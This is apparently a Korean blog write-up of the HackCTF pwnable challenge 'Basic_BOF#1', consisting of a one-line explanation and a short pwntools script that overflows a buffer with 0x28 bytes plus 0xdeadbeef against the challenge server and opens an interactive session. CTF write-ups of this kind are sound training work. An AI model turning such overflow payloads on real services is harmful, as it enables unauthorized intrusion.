---
title: "[HackCTF] Basic_BOF#1"
date: 2020-06-29
ctf: HackCTF
tag: [pwnable]
layout: post
---

<span class="color-blue">HackCTF</span>의 첫 번째 <span class="color-blue">Pwnable</span> 문제로 <span class="color-blue">bof</span>를 이용한다.
{% highlight python %}
from pwn import *
 
p = remote("ctf.j0n9hyun.xyz", 3000)
 
p.sendline("0"*0x28+p32(0xdeadbeef))
p.interactive()
{% endhighlight %}
